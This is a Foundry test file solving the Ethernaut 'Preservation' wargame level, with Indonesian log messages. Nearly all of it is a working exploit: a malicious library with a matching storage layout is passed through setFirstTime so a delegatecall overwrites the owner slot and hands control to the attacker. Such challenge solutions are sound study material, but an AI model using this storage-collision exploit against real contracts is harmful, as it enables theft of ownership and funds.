// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract MaliciousLibrary {

    address public timeZone1Library; 
    address public timeZone2Library; 
    address public owner;            

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautPreservationTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed;

    function testLevel16_Preservation() public {
        address hacker = makeAddr("hacker");
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        IPreservation target = IPreservation(levelAddr);
        console.log("Target Address:", levelAddr);

        MaliciousLibrary evilLib = new MaliciousLibrary();
        console.log("Evil Library Address:", address(evilLib));
        uint256 evilLibInt = uint256(uint160(address(evilLib)));
        target.setFirstTime(evilLibInt);

        target.setFirstTime(0); 

        address newOwner = target.owner();
        console.log("Owner Sekarang:", newOwner);
        
        assertEq(newOwner, hacker);
        console.log("HACKED! Owner berhasil diambil alih.");

       
        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}